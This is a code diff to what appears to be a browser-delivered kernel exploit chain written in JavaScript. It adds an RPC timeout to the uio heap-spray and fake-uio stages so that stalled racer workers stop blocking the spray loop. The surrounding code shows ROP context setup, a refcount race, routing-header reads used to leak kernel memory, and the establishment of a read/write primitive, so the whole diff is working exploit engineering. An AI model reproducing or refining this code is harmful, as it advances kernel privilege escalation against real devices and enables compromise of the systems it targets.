@@ -1,4 +1,4 @@
-import { establishPrimitive } from "./core.js";
+﻿import { establishPrimitive } from "./core.js";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { createContext, layoutContext, forceYield } from "./module/rop.js";
@@ -322,6 +322,26 @@ function yieldOnce() {
 
 
 const JOIN_MS = params.has("joinms") ? parseInt(params.get("joinms"), 10) : 5000;
+/*
+RPC TIMEOUT for the uio spray fan-outs (landUio / landFakeUio).
+
+These used to pass 0, which makeRpc treats as "no timer". That is a BLOCKAGE,
+not a preference: a promise with no timer never rejects, and a worker's
+onmessage is single-threaded, so one racer wedged inside writev blocks that
+worker for ever -- and every later round just queues more messages behind it.
+The log showed exactly that:
+
+    UIO-LAND-AT  i=0 size=8
+    <silence>
+
+fireTracked (the refcount race) deliberately WANTS the racers to park and keeps
+its 0; it measures parking via t.settled. landUio/landFakeUio have no such
+need -- they bound the wait with boundedJoin anyway, and the missing RPC timer
+is what made the bound useless. Give them a real one so a wedged racer rejects
+and the queue drains. Override with ?uiorms=.
+*/
+const UIO_RPC_MS = params.has("uiorms")
+    ? parseInt(params.get("uiorms"), 10) : 4000;
 const R2_ON = params.get("r2") !== "0";
 const PAIR_ON = params.get("pair") === "1";
 const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 6;
@@ -2045,7 +2065,8 @@ function makeKarwHelpers() {
                 for (let k = 0; k < uioWorkers.length; ++k)
                     tasks[k] = fireW(uioWorkers[k],
                         forWrite ? SYS.readv : SYS.writev,
-                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
+                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV],
+                        UIO_RPC_MS);
                 sc(SYS.sched_yield);
                 /*
                 ROUND 0 IS A RENDEZVOUS, and this is what the log showed:
@@ -2224,7 +2245,7 @@ function makeKarwHelpers() {
                 if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
                 for (let k = 0; k < iovWorkers.length; ++k)
                     tasks[k] = fireW(iovWorkers[k], SYS.recvmsg,
-                        [iovSs[0], msgAddr, 0], 0);
+                        [iovSs[0], msgAddr, 0], UIO_RPC_MS);
                 sc(SYS.sched_yield);
                 if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0
                     && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
